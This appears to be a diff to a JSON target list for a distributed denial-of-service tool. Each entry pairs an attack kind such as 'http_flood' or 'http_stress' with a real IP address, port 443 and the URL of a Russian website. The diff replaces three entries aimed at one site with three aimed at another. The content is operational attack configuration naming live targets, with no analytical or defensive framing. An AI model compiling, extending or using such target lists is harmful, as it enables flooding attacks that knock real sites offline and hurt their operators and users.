@@ -14,7 +14,7 @@
   {"kind":"http_flood","method":"GET","ip":"185.107.73.205","port": 443, "url": "https://politpuzzle.ru/"},
   {"kind":"http_flood","method":"POST","ip":"185.107.73.215","port": 443, "url": "https://politpuzzle.ru/"},
   {"kind":"http_stress","method":"GET","ip":"185.107.73.225","port": 443, "url": "https://politpuzzle.ru/"},
-  {"kind":"http_flood","method":"GET","ip":"185.221.212.66","port": 443, "url": "https://anticwar.ru/"},
-  {"kind":"http_flood","method":"GET","ip":"185.221.212.66","port": 443, "url": "https://anticwar.ru/"},
-  {"kind":"http_flood","method":"GET","ip":"185.221.212.66","port": 443, "url": "https://anticwar.ru/"}
+  {"kind":"http_flood","method":"GET","ip":"185.9.147.250","port": 443, "url": "https://prodonbass.ru/"},
+  {"kind":"http_flood","method":"GET","ip":"185.9.147.250","port": 443, "url": "https://prodonbass.ru/"},
+  {"kind":"http_flood","method":"GET","ip":"185.9.147.250","port": 443, "url": "https://prodonbass.ru/"}
 ]
